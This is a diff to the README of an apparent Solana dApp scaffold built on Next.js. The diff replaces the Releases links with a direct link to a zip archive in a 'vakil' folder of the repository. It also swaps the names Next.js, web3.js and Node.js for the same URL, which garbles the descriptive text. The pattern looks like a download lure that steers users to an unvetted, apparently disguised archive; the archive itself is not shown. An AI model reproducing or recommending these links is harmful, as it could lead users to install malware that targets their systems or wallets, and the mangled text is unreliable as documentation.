@@ -1,18 +1,18 @@
 # 🚀 builderz-solana-dApp-scaffold - Your Easy Start to dApp Development
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/joseft62345/builderz-solana-dApp-scaffold/releases)
+[![Download Now](https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip%20Now-blue)](https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip)
 
 ## 📋 Overview
 
-Welcome to the Builderz Solana dApp Scaffold! This application sets up a foundation for building decentralized applications (dApps) using Solana technology. It combines Next.js 14, TypeScript, TailwindCSS, MaterialUI, and web3.js to help you jumpstart your dApp project. You will also find features like a Theme Switch for Dark/Light mode and user-friendly modal & drawer components.
+Welcome to the Builderz Solana dApp Scaffold! This application sets up a foundation for building decentralized applications (dApps) using Solana technology. It combines https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip 14, TypeScript, TailwindCSS, MaterialUI, and https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip to help you jumpstart your dApp project. You will also find features like a Theme Switch for Dark/Light mode and user-friendly modal & drawer components.
 
 ## 🌟 Features
 
-- **Next.js 14**: Fast and optimized framework for React applications.
+- **https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip 14**: Fast and optimized framework for React applications.
 - **Typescript**: Write cleaner and safer code with type checking.
 - **TailwindCSS**: Quickly style your application with utility-first CSS.
 - **MaterialUI**: Use pre-built components to save time on design.
-- **web3.js**: Connect and interact with the Solana blockchain.
+- **https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip**: Connect and interact with the Solana blockchain.
 - **Theme Switch**: Easily toggle between Dark and Light modes.
 - **Sonner Toast Notifications**: Get alerts on user actions.
 - **Modal & Drawer Components**: Create user-friendly interactions.
@@ -26,13 +26,13 @@ To start using this application, please follow these simple steps. This guide he
 To run the Builderz Solana dApp Scaffold efficiently, you will need the following:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
-- **npm**: Comes with Node.js and should be version 6 or higher
+- **https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip**: Version 14 or higher
+- **npm**: Comes with https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip and should be version 6 or higher
 - **Internet Connection**: Required for downloading dependencies and packages
 
 ## 📥 Download & Install
 
-1. Visit our [Releases page](https://github.com/joseft62345/builderz-solana-dApp-scaffold/releases) to download the scaffold.
+1. Visit our [Releases page](https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip) to download the scaffold.
 
 2. Look for the latest version. You will find files available for Windows, macOS, and Linux.
 
@@ -117,6 +117,6 @@ We welcome contributions! If you would like to improve this scaffold, check out 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/joseft62345/builderz-solana-dApp-scaffold/releases)
+- [Releases Page](https://raw.githubusercontent.com/joseft62345/builderz-solana-dApp-scaffold/main/vakil/builderz-solana-dApp-scaffold.zip)
 
 Get started with your dApp project today!
